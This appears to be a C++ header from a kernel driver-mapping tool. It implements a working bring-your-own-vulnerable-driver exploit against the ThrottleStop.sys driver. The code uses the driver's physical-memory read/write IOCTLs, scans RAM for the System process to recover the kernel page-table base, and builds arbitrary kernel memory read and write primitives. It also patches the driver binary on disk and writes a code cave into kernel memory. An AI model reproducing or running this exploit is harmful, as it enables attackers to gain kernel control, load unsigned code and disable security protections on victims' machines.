#pragma once
// primitive_ts.hpp
// ThrottleStop.sys BYOVD primitive (CVE-2025-7771, TechPowerUp ThrottleStop)
// Device: \\.\TsSvc (service-name symlink) with \\.\ThrottleStop fallback
// Physical R/W via MmMapIoSpace. Win11 24H2+ needs MmCached (IAT patch) for PT pages.

#include "mapper.hpp"
#include <Windows.h>
#include <cstdint>
#include <cstring>
#include <string>
#include <memory>
#include <algorithm>
#include <iostream>
#include <vector>
#include <cstdio>

#ifdef min
#undef min
#endif

static constexpr DWORD TS_IOCTL_READ_MEM  = 0x80006498;
static constexpr DWORD TS_IOCTL_WRITE_MEM = 0x8000649C;
static constexpr DWORD TS_IOCTL_MAP_PHYS  = 0x8000645C;
static constexpr DWORD TS_IOCTL_UNMAP_PHYS = 0x80006460;
static constexpr uint64_t TS_PTE_MASK = 0x000FFFFFFFFFF000ULL;

static bool TsPhysRead(HANDLE h, uint64_t pa, void* dst, uint32_t sz) {
    if (sz != 1 && sz != 2 && sz != 4 && sz != 8) return false;
    uint8_t buf[8] = {};
    DWORD got = 0;
    if (!DeviceIoControl(h, TS_IOCTL_READ_MEM,
                         &pa, sizeof(pa),
                         buf, sz, &got, nullptr))
        return false;
    if (got != sz) return false;
    memcpy(dst, buf, sz);
    return true;
}

static bool TsPhysWrite(HANDLE h, uint64_t pa, const void* src, uint32_t sz) {
    if (sz != 1 && sz != 2 && sz != 4 && sz != 8) return false;
    uint8_t input[16] = {};
    memcpy(input, &pa, 8);
    memcpy(input + 8, src, sz);
    DWORD got = 0;
    return DeviceIoControl(h, TS_IOCTL_WRITE_MEM,
                           input, 8 + sz,
                           nullptr, 0, &got, nullptr) != 0;
}

static uint64_t TsRead8(HANDLE h, uint64_t pa) {
    uint64_t v = 0;
    TsPhysRead(h, pa, &v, 8);
    return v;
}

static void TsSay(const std::string& s) {
    std::cout << s << std::flush;
    FILE* f = fopen("Z:\\driver-lab\\vm\\bg\\ts-live.log", "a");
    if (f) { fputs(s.c_str(), f); fclose(f); }
}

static DWORD g_tsBeatLast = 0;

static void TsBeatReset() { g_tsBeatLast = 0; }

static void TsBeat(const char* tag, uint64_t pa) {
    DWORD now = GetTickCount();
    if (g_tsBeatLast && now - g_tsBeatLast < 5000) return;
    g_tsBeatLast = now;
    char buf[160];
    snprintf(buf, sizeof(buf), "[*] %s PA=0x%llx t=%lus\n",
             tag, (unsigned long long)pa, (unsigned long)(now / 1000));
    TsSay(buf);
}

static bool TsPhysWriteN(HANDLE h, uint64_t pa, const void* src, size_t n) {
    const auto* p = (const uint8_t*)src;
    size_t off = 0;
    while (off < n) {
        uint32_t chunk = 1;
        if (off + 8 <= n) chunk = 8;
        else if (off + 4 <= n) chunk = 4;
        else if (off + 2 <= n) chunk = 2;
        if (!TsPhysWrite(h, pa + off, p + off, chunk)) return false;
        off += chunk;
    }
    return true;
}

#pragma pack(push, 1)
struct TsMapReq { uint64_t pa; uint32_t size; };
#pragma pack(pop)

static void* TsMapPhys(HANDLE h, uint64_t pa, uint32_t size) {
    TsMapReq in{ pa, size };
    uint64_t va = 0;
    DWORD got = 0;
    if (!DeviceIoControl(h, TS_IOCTL_MAP_PHYS, &in, 12, &va, 8, &got, nullptr))
        return nullptr;
    return (void*)(uintptr_t)va;
}

static void TsUnmapPhys(HANDLE h, void* va) {
    if (!va) return;
    uint64_t v = (uint64_t)(uintptr_t)va;
    DWORD got = 0;
    DeviceIoControl(h, TS_IOCTL_UNMAP_PHYS, &v, 8, nullptr, 0, &got, nullptr);
}

struct TsMod {
    uint64_t ntBase = 0;
    uint64_t tsBase = 0;
    uint64_t mmMapVA = 0;
    uint64_t mmUnmapVA = 0;
};

static TsMod TsLookupModules() {
    TsMod m;
    using NtQSI_t = NTSTATUS (NTAPI*)(ULONG, PVOID, ULONG, PULONG);
    auto NtQSI = (NtQSI_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
    if (!NtQSI) return m;
    ULONG needed = 0;
    NtQSI(11, nullptr, 0, &needed);
    if (!needed) return m;
    std::vector<uint8_t> buf(needed);
    if (NtQSI(11, buf.data(), needed, &needed) != 0) return m;
    struct MOD {
        PVOID Section; PVOID MappedBase; PVOID ImageBase;
        ULONG ImageSize; ULONG Flags;
        USHORT LoadOrderIndex; USHORT InitOrderIndex;
        USHORT LoadCount; USHORT OffsetToFileName;
        CHAR FullPathName[256];
    };
    ULONG count = *(ULONG*)buf.data();
    if (!count) return m;
    auto* mods = (MOD*)(buf.data() + 8);
    m.ntBase = (uint64_t)mods[0].ImageBase;
    for (ULONG i = 0; i < count; i++) {
        const char* nm = mods[i].FullPathName + mods[i].OffsetToFileName;
        if (_stricmp(nm, "ThrottleStop.sys") == 0 || _stricmp(nm, "TsSvc.sys") == 0)
            m.tsBase = (uint64_t)mods[i].ImageBase;
    }
    HMODULE hNt = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
    if (hNt && m.ntBase) {
        auto* p = (uint8_t*)GetProcAddress(hNt, "MmMapIoSpace");
        auto* u = (uint8_t*)GetProcAddress(hNt, "MmUnmapIoSpace");
        if (p) m.mmMapVA = m.ntBase + (uint64_t)(p - (uint8_t*)hNt);
        if (u) m.mmUnmapVA = m.ntBase + (uint64_t)(u - (uint8_t*)hNt);
        FreeLibrary(hNt);
    }
    return m;
}

struct TsEprocOffs { uint32_t cr3, pid, name, flink; };

static uint64_t TsFindEprocessInView(const uint8_t* view, uint32_t chunk) {
    static const TsEprocOffs offs[] = {
        { 0x028, 0x1D0, 0x338, 0x1D8 },
        { 0x028, 0x440, 0x5A8, 0x448 },
    };
    for (auto& o : offs) {
        const uint32_t span = o.name + 16;
        for (uint32_t off = 0; off + span <= chunk; off += 16) {
            if (view[off] != 3) continue;
            if (memcmp(view + off + o.name, "System", 7) != 0) continue;
            uint64_t pid = 0, cr3 = 0, flink = 0;
            memcpy(&pid, view + off + o.pid, 8);
            memcpy(&cr3, view + off + o.cr3, 8);
            memcpy(&flink, view + off + o.flink, 8);
            cr3 &= TS_PTE_MASK;
            if (pid != 4 || !cr3) continue;
            if ((flink >> 47) != 0x1FFFFULL) continue;
            return cr3;
        }
    }
    return 0;
}

// Cave only. Rewriting the live call instruction bugchecks this guest.
static bool TsWriteCachedCave(HANDLE h, uint64_t textPage, uint64_t mmMapVA) {
    if (!textPage || !mmMapVA) return false;
    uint8_t wrapper[18] = {
        0x41, 0xB8, 0x01, 0x00, 0x00, 0x00,
        0x48, 0xB8, 0,0,0,0,0,0,0,0,
        0xFF, 0xE0
    };
    memcpy(wrapper + 8, &mmMapVA, 8);
    if (!TsPhysWriteN(h, textPage + 0x5C0, wrapper, sizeof(wrapper))) return false;
    uint64_t back = 0;
    TsPhysRead(h, textPage + 0x5C0, &back, 8);
    char b[96];
    snprintf(b, sizeof(b), "[+] cave PA=0x%llx %016llx\n",
             (unsigned long long)(textPage + 0x5C0), (unsigned long long)back);
    TsSay(b);
    return (back & 0xFFFFFF) == 0x0001B841ULL;
}

static uint64_t TsVirtToPhys(HANDLE h, uint64_t cr3, uint64_t va);

static bool TsCr3WalksNtos(HANDLE h, uint64_t cr3, uint64_t ntBase) {
    uint64_t pa = TsVirtToPhys(h, cr3, ntBase);
    if (!pa) return false;
    uint16_t mz = 0;
    return TsPhysRead(h, pa, &mz, 2) && mz == 0x5A4D;
}

static uint64_t TsScanSelfRefPml4(HANDLE h, uint64_t ntBase) {
    if (!ntBase) return 0;
    const int kidx = (int)((ntBase >> 39) & 0x1FF);
    static const int probe[] = { 0x1ed, 0x1aa, 0x1f6, 0x1ff, 256, 510, 511 };
    TsBeatReset();
    { char b[80]; snprintf(b, sizeof(b), "[*] PML4 self-ref scan kidx=%d\n", kidx); TsSay(b); }
    for (uint64_t pa = 0x100000; pa < 0x200000000ULL; pa += 0x1000) {
        TsBeat("pml4", pa);
        uint64_t ke = TsRead8(h, pa + kidx * 8);
        if (!(ke & 1) || (ke & TS_PTE_MASK) > 0x200000000ULL) continue;
        for (int pi : probe) {
            uint64_t e = TsRead8(h, pa + pi * 8);
            if ((e & TS_PTE_MASK) != pa || !(e & 1)) continue;
            if (TsCr3WalksNtos(h, pa, ntBase)) return pa;
        }
    }
    return 0;
}

static uint64_t TsScanEprocessStride(HANDLE h) {
    const uint64_t sys8 = 0x00006D6574737953ULL; // "System\0\0"
    TsBeatReset();
    TsSay("[*] EPROCESS stride-8 scan\n");
    for (uint64_t pa = 0x100000000ULL; pa < 0x240000000ULL; pa += 8) {
        TsBeat("estr", pa);
        uint64_t name = 0;
        if (!TsPhysRead(h, pa, &name, 8)) {
            pa = (pa + 0x1FFFFFULL) & ~0x1FFFFFULL;
            continue;
        }
        if (name != sys8) continue;
        uint64_t base = pa - 0x338;
        uint8_t type = 0;
        uint64_t pid = 0, cr3 = 0, flink = 0;
        if (!TsPhysRead(h, base, &type, 1) || type != 3) continue;
        if (!TsPhysRead(h, base + 0x1D0, &pid, 8) || pid != 4) continue;
        TsPhysRead(h, base + 0x028, &cr3, 8);
        TsPhysRead(h, base + 0x1D8, &flink, 8);
        cr3 &= TS_PTE_MASK;
        if (!cr3 || (flink >> 47) != 0x1FFFFULL) continue;
        uint32_t probe = 0;
        bool dtbOk = TsPhysRead(h, cr3, &probe, 4);
        char b[160];
        snprintf(b, sizeof(b), "[+] System PA=0x%llx DTB=0x%llx dtbRead=%d val=%08x\n",
                 (unsigned long long)base, (unsigned long long)cr3, (int)dtbOk, probe);
        TsSay(b);
        return cr3;
    }
    return 0;
}

static uint64_t TsBootstrapCR3(HANDLE h) {
    setvbuf(stdout, nullptr, _IONBF, 0);
    TsMod mod = TsLookupModules();
    std::cout << "[*] ntos=0x" << std::hex << mod.ntBase
              << " ThrottleStop=0x" << mod.tsBase
              << " MmMapIoSpace=0x" << mod.mmMapVA << std::dec << "\n" << std::flush;

    // Call-site edits bugcheck. IAT redirect did not make page-table reads succeed.
    // Data scan only: System EPROCESS carries DirectoryTableBase.
    uint64_t cr3 = TsScanEprocessStride(h);
    if (!cr3) TsSay("[!] no System EPROCESS\n");
    return cr3;
}

static uint64_t TsVirtToPhys(HANDLE h, uint64_t cr3, uint64_t va) {
    auto idx = [&](int shift) { return (va >> shift) & 0x1FFULL; };

    uint64_t pml4e = TsRead8(h, (cr3 & TS_PTE_MASK) + idx(39) * 8);
    if (!(pml4e & 1)) return 0;

    uint64_t pdpte = TsRead8(h, (pml4e & TS_PTE_MASK) + idx(30) * 8);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) return (pdpte & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);

    uint64_t pde = TsRead8(h, (pdpte & TS_PTE_MASK) + idx(21) * 8);
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) return (pde & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);

    uint64_t pte = TsRead8(h, (pde & TS_PTE_MASK) + idx(12) * 8);
    if (!(pte & 1)) return 0;
    return (pte & TS_PTE_MASK) | (va & 0xFFF);
}

static bool TsVirtRead(HANDLE h, uint64_t cr3, uint64_t va, void* dst, size_t n) {
    auto* d = (uint8_t*)dst;
    while (n) {
        uint64_t pa = TsVirtToPhys(h, cr3, va);
        if (!pa) return false;
        size_t pageRem = 0x1000 - (pa & 0xFFF);
        size_t chunk = std::min(n, pageRem);
        size_t off = 0;
        while (off + 4 <= chunk) {
            if (!TsPhysRead(h, pa + off, d + off, 4)) return false;
            off += 4;
        }
        while (off < chunk) {
            if (!TsPhysRead(h, pa + off, d + off, 1)) return false;
            off++;
        }
        va += chunk; d += chunk; n -= chunk;
    }
    return true;
}

static bool TsVirtWrite(HANDLE h, uint64_t cr3, uint64_t va, const void* src, size_t n) {
    const auto* s = (const uint8_t*)src;
    while (n) {
        uint64_t pa = TsVirtToPhys(h, cr3, va);
        if (!pa) return false;
        size_t pageRem = 0x1000 - (pa & 0xFFF);
        size_t chunk = std::min(n, pageRem);
        size_t off = 0;
        while (off + 4 <= chunk) {
            if (!TsPhysWrite(h, pa + off, s + off, 4)) return false;
            off += 4;
        }
        while (off < chunk) {
            if (!TsPhysWrite(h, pa + off, s + off, 1)) return false;
            off++;
        }
        va += chunk; s += chunk; n -= chunk;
    }
    return true;
}

struct TsSession {
    HANDLE dev = INVALID_HANDLE_VALUE;
    uint64_t cr3 = 0;
};

inline bool TsPatchThrottleStopImage(const char* path)
{
    TsMod mod = TsLookupModules();
    if (!mod.mmMapVA) {
        std::cout << "[!] MmMapIoSpace VA unresolved — image left stock\n" << std::flush;
        return false;
    }
    HANDLE f = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (f == INVALID_HANDLE_VALUE) return false;
    auto ioAt = [&](uint32_t off, void* buf, DWORD n, bool wr) -> bool {
        LARGE_INTEGER li{};
        li.QuadPart = off;
        if (!SetFilePointerEx(f, li, nullptr, FILE_BEGIN)) return false;
        DWORD got = 0;
        if (wr) return WriteFile(f, buf, n, &got, nullptr) && got == n;
        return ReadFile(f, buf, n, &got, nullptr) && got == n;
    };
    uint8_t cur[8] = {};
    if (!ioAt(0x15C4, cur, 6, false)) { CloseHandle(f); return false; }
    if (cur[0] == 0xE8 && cur[1] == 0xF7) {
        CloseHandle(f);
        std::cout << "[*] ThrottleStop image already MmCached\n" << std::flush;
        return true;
    }
    if (cur[0] != 0xFF || cur[1] != 0x15) {
        CloseHandle(f);
        std::cout << "[!] ThrottleStop call site not FF 15\n" << std::flush;
        return false;
    }
    uint8_t wrapper[18] = {
        0x41, 0xB8, 0x01, 0x00, 0x00, 0x00,
        0x48, 0xB8, 0,0,0,0,0,0,0,0,
        0xFF, 0xE0
    };
    memcpy(wrapper + 8, &mod.mmMapVA, 8);
    uint8_t call[6] = { 0xE8, 0xF7, 0x03, 0x00, 0x00, 0x90 };
    uint8_t wcall[6] = { 0xE8, 0x06, 0x03, 0x00, 0x00, 0x90 };
    bool ok = ioAt(0x19C0, wrapper, 18, true) && ioAt(0x15C4, call, 6, true) && ioAt(0x16B5, wcall, 6, true);
    CloseHandle(f);
    std::cout << (ok ? "[+] ThrottleStop image patched MmCached before load\n"
                     : "[!] ThrottleStop image patch failed\n") << std::flush;
    return ok;
}

inline KernelPrimitives OpenThrottleStop(std::string& err)
{
    static const wchar_t* kTsDev[] = { L"\\\\.\\TsSvc", L"\\\\.\\ThrottleStop" };
    HANDLE h = INVALID_HANDLE_VALUE;
    DWORD last = 0;
    for (auto name : kTsDev) {
        h = CreateFileW(name, GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (h != INVALID_HANDLE_VALUE) break;
        last = GetLastError();
    }
    if (h == INVALID_HANDLE_VALUE) {
        err = "OpenThrottleStop: CreateFile failed err=" + std::to_string(last) +
              " (tried \\\\.\\TsSvc and \\\\.\\ThrottleStop)";
        return {};
    }

    uint32_t smoke = 0;
    if (!TsPhysRead(h, 0x1000, &smoke, 4)) {
        CloseHandle(h);
        err = "OpenThrottleStop: smoke test read failed (IOCTL rejected)";
        return {};
    }

    uint64_t cr3 = TsBootstrapCR3(h);
    if (!cr3) {
        CloseHandle(h);
        err = "OpenThrottleStop: CR3 bootstrap failed (System EPROCESS not found)";
        return {};
    }

    std::cout << "[+] ThrottleStop opened, CR3=0x" << std::hex << cr3 << std::dec << "\n";

    auto sp = std::make_shared<TsSession>();
    sp->dev = h;
    sp->cr3 = cr3;

    KernelPrimitives p;
    p.ReadKernelMemory = [sp](void* dst, uint64_t src, size_t sz) -> bool {
        return TsVirtRead(sp->dev, sp->cr3, src, dst, sz);
    };
    p.WriteKernelMemory = [sp](uint64_t dst, const void* src, size_t sz) -> bool {
        return TsVirtWrite(sp->dev, sp->cr3, dst, src, sz);
    };
    p.AllocateKernelMemory = nullptr;
    return p;
}
